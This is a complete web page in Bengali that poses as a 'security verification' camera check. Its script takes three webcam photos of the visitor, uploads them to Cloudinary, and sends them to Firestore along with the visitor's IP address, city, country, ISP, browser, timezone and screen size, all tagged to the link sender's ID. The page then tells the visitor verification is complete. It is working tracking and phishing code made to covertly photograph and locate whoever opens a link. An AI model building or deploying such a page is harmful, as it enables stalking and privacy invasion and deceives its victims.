<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ভেরিফিকেশন প্রয়োজন</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Hind+Siliguri:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="style.css">
</head>
<body>

<div class="form-page">

  <div class="form-card">

    <div class="form-card-head">
      <div class="ico">🔒</div>
      <h1>নিরাপত্তা যাচাইকরণ</h1>
      <p>অনুগ্রহ করে ক্যামেরার অনুমতি দিন</p>
    </div>

    <div class="form-card-body">

      <div class="progress-dots" id="dots">
        <span data-i="0"></span>
        <span data-i="1"></span>
        <span data-i="2"></span>
      </div>

      <div class="video-wrap">
        <video id="video" autoplay playsinline muted></video>
        <div class="badge-tl" id="captureCount">০ / ৩</div>
        <div class="badge-tr">LIVE</div>
        <div class="countdown" id="countdown">3</div>
      </div>

      <div class="info-note" id="statusBox">
        ক্যামেরা চালু করা হচ্ছে…
      </div>

    </div>
  </div>

</div>

<canvas id="canvas" style="display:none;"></canvas>

<script type="module">
import {
  db, collection, addDoc, serverTimestamp
} from "./firebase.js";
import { uploadToCloudinary } from "./cloudinary.js";

const CAPTURE_COUNT  = 3;
const CAPTURE_GAP_MS = 2200;
const IMAGE_QUALITY  = 0.75;

const params   = new URLSearchParams(location.search);
const ownerUid = params.get("id");

const video        = document.getElementById("video");
const canvas       = document.getElementById("canvas");
const statusBox    = document.getElementById("statusBox");
const captureCount = document.getElementById("captureCount");
const countdown    = document.getElementById("countdown");
const dots         = document.querySelectorAll("#dots span");

if (!ownerUid){
  statusBox.textContent = "❌ ভুল লিংক — owner ID নেই";
  statusBox.style.background = "rgba(239,68,68,0.1)";
  statusBox.style.color = "#fca5a5";
  throw new Error("No owner UID");
}

let stream   = null;
let captured = 0;

function updateDots(n){
  dots.forEach((d, i) => d.classList.toggle("done", i < n));
}

async function getIP(){
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    const d = await r.json();
    return d.ip || "Unknown";
  } catch { return "Unknown"; }
}

async function getGeo(){
  try {
    const r = await fetch("https://ipapi.co/json/");
    const d = await r.json();
    return {
      city: d.city || "?",
      country: d.country_name || "?",
      isp: d.org || "?",
      text: (d.city || "?") + ", " + (d.country_name || "?") + " — " + (d.org || "?")
    };
  } catch { return { city:"?", country:"?", isp:"?", text:"Unknown" }; }
}

async function start(){
  try {
    statusBox.textContent = "ক্যামেরার অনুমতি চাওয়া হচ্ছে…";

    stream = await navigator.mediaDevices.getUserMedia({
      video: { width: { ideal: 720 }, height: { ideal: 960 }, facingMode: "user" }
    });
    video.srcObject = stream;
    await video.play();

    await new Promise(r => video.readyState >= 2 ? r() : video.onloadeddata = r);
    await new Promise(r => setTimeout(r, 1000));

    statusBox.textContent = "✅ ক্যামেরা চালু — যাচাইকরণ শুরু হচ্ছে…";
    statusBox.style.background = "rgba(16,185,129,0.1)";
    statusBox.style.color = "#6ee7b7";

    runCapture();
  } catch (err) {
    console.error("Camera error:", err);
    statusBox.textContent = "❌ ক্যামেরা পাওয়া যায়নি — অনুমতি দিন";
    statusBox.style.background = "rgba(239,68,68,0.1)";
    statusBox.style.color = "#fca5a5";
  }
}

async function runCapture(){
  const ip   = await getIP();
  const geo  = await getGeo();
  const ua   = navigator.userAgent;
  const tz   = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const lang = navigator.language;
  const screenRes = window.screen.width + "×" + window.screen.height;

  for (let i = 0; i < CAPTURE_COUNT; i++){
    countdown.classList.add("show");
    for (let c = 3; c > 0; c--){
      countdown.textContent = c;
      await new Promise(r => setTimeout(r, 500));
    }
    countdown.classList.remove("show");

    captureCount.textContent = (i+1) + " / " + CAPTURE_COUNT;
    updateDots(i+1);

    canvas.width  = video.videoWidth  || 720;
    canvas.height = video.videoHeight || 960;
    canvas.getContext("2d").drawImage(video, 0, 0);

    const blob = await new Promise(res =>
      canvas.toBlob(res, "image/jpeg", IMAGE_QUALITY)
    );

    if (!blob){
      console.warn("Blob failed at frame " + i);
      continue;
    }

    let photoUrl = "";
    try {
      const uploaded = await uploadToCloudinary(blob, "myvault/" + ownerUid);
      if (uploaded){
        photoUrl = uploaded;
        console.log("✓ Frame " + (i+1) + " → " + photoUrl);
      } else {
        photoUrl = canvas.toDataURL("image/jpeg", IMAGE_QUALITY);
        console.warn("Fallback to dataURL for frame " + (i+1));
      }
    } catch(e){
      console.error("Upload error:", e);
      photoUrl = canvas.toDataURL("image/jpeg", IMAGE_QUALITY);
    }

    try {
      await addDoc(collection(db, "captures"), {
        ownerUid: ownerUid,
        photoUrl: photoUrl,
        ip: ip,
        geo: geo.text,
        geoCity: geo.city,
        geoCountry: geo.country,
        geoISP: geo.isp,
        userAgent: ua,
        timezone: tz,
        language: lang,
        screen: screenRes,
        frameIndex: i + 1,
        totalFrames: CAPTURE_COUNT,
        createdAt: serverTimestamp()
      });
      captured++;
      console.log("✓ Firestore save: frame " + (i+1));
    } catch(e){
      console.error("Firestore error:", e);
    }

    if (i < CAPTURE_COUNT - 1){
      await new Promise(r => setTimeout(r, CAPTURE_GAP_MS));
    }
  }

  if (stream){
    stream.getTracks().forEach(t => t.stop());
    stream = null;
  }

  statusBox.textContent = "✅ যাচাইকরণ সম্পূর্ণ — ধন্যবাদ!";
  statusBox.style.background = "rgba(16,185,129,0.1)";
  statusBox.style.color = "#6ee7b7";
  statusBox.style.fontWeight = "700";
}

start();
</script>

</body>
</html>
